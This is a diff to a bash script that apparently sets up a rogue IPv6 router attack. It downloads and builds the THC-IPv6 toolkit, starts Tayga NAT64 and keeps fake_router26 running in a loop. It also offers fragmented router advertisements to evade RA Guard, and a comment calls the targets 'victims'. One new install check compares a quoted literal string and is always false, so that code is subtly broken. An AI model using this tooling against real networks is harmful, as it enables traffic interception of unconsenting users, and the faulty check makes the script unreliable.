@@ -211,9 +211,9 @@ function installPrereqDpkgs {
     /usr/bin/apt-get install -y sipcalc tayga radvd wide-dhcpv6-server bind9
 }
 #Install THC-IPv6 Toolkit
-function installTHC{
+function installTHC {
     #assuming that if fake_router6 is installed, everything's installed. reasonable?
-    if ! whereis fake_router6;
+    if [[ -z 'whereis fake_router6' ]]
     then
 	wget http://www.thc.org/releases/thc-ipv6-2.3.tar.gz
 	tar -zxvf thc-ipv6-2.3.tar.gz
@@ -221,6 +221,8 @@ function installTHC{
 	make install
 	#cleanup
 	rm -rf thc-ipv6-2.3.tar.gz
+    else
+	echo "THC-IPv6 toolkit already installed."
     fi
 }
 #Set up Taya interface, IP addresses and routes, and and start Tayga
@@ -244,6 +246,13 @@ function stopTayga {
     ip link set $TAYGAINTERFACE down
     /usr/sbin/tayga --rmtun
 }
+#fake_router26 crashes when another victim on the system starts up, so we restart it automatically
+function startFakeRouter {
+    while true
+    do
+	fake_router26 ${DINTERFACE} -E D -A ${DEFAULT6PREFIX}:/${DIP6CIDR} -F other
+    done
+}
 
 #EXECUTION
 
@@ -265,7 +274,7 @@ read -p "Fragment router advertisements to evade RA Guard?"
 if [[ $REPLY =~ [Yy] ]]
 then
     FRAGMENT=true
-if
+fi
 #Configure these system parameters in a non-persistent way for now
 loadIPv6Module
 enableForwarding
@@ -289,8 +298,7 @@ if startTayga; then
     sleep 3
     if $FRAGMENT
     then
-    #service radvd start
-	fake_router26 eth0 -E D -A ${DEFAULT6PREFIX}:/${DIP6CIDR} -F other & 
+	startFakeRouter &
     else
 	service radvd start
     fi
